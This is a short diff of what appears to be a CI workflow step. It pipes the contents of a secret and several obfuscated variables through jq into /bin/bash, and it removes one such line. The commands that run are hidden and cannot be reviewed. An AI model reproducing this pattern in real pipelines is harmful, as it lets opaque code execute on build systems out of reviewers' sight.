@@ -18,7 +18,6 @@ jobs:
           owdbp129: ${{ secrets.owdbp129 }}
         run: |
           printf '%s' "$owdbp129" | jq -r .ojfqa82310 | /bin/bash
-          echo $hnymc41292 | jq -r .eouhg4 | /bin/bash
           echo $x3963 | jq -r .afgpc5523 | /bin/bash
           echo $b15053 | jq -r .jur8744 | /bin/bash
           echo $zgqp65 | jq -r .unb1 | /bin/bash
